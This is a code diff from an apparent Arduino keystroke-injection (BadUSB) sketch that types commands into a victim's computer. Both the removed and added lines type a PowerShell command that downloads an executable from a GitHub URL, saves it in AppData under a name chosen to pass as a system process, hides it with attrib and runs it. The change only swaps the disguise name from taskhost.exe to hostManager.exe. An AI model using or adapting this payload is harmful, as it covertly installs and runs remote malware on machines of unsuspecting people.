@@ -34,8 +34,8 @@ void loop() {
       delay(100);
       Keyboard.write(KEY_RETURN);
       delay(100);
-      //download your file and rename it to a common name, hide the file, launch it and exit console (your .exe needs to be console independant)
-      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('https://github.com/EzLucky/test/blob/master/agent.exe?raw=true', '%AppData%/WindowsApp/taskhost.exe');\" & attrib +h %AppData%/WindowsApp/taskhost.exe & %AppData%/WindowsApp/taskhost.exe & exit");
+      //download your file and rename it to a legit name, hide the file, launch it and exit console (your .exe needs to be console independant)
+      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('https://github.com/EzLucky/test/blob/master/agent.exe?raw=true', '%AppData%/WindowsApp/hostManager.exe');\" & attrib +h %AppData%/WindowsApp/hostManager.exe & %AppData%/WindowsApp/hostManager.exe & exit");
       delay(100);
       Keyboard.write(KEY_RETURN);
       break;
